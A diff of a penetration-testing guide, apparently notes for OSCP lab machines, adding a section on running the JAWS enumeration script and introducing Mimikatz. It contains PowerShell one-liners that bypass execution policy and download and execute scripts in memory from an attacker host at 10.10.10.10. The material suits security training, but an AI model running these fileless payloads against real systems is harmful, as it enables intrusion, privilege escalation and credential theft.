@@ -208,12 +208,35 @@ Serving HTTP on 0.0.0.0 port 80 ...
 ```
 Now we can run this from the remote Windows CMD shell:  
 ```cmd
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Sherlock.ps1'))"
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Sherlock.ps1'))"
 ```
 Or from a Windows Powershell:
 ```powershell
-IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')
+PS C:\> IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')
 ```
+
+### Running JAWS - Just Another Windows (Enum) Script
+JAWS is another powershell library that was built with privledge escalation of the OSCP lab machines in mind. 
+We can stage and run JAWS on a remote http server so the file never needs to hit the remote server's HDD.  
+```bash
+root@kali:~test# git clone https://github.com/411Hall/JAWS
+```
+Now we can run this from the remote Windows CMD shell:  
+```cmd
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/jaws-enum.ps1'))"
+```
+Or from a Windows Powershell:
+```powershell
+PS C:\> IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/jaws-enum.ps1')
+```
+And we should see the following output start to appear:
+```
+Running J.A.W.S. Enumeration
+        - Gathering User Information
+        - Gathering Processes, Services and Scheduled Tasks
+        - Gathering Installed Software
+```
+
 
 ## Running Mimikatz
 Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM/NTDS.dit databases, advanced Kerberos functionality, and more.  
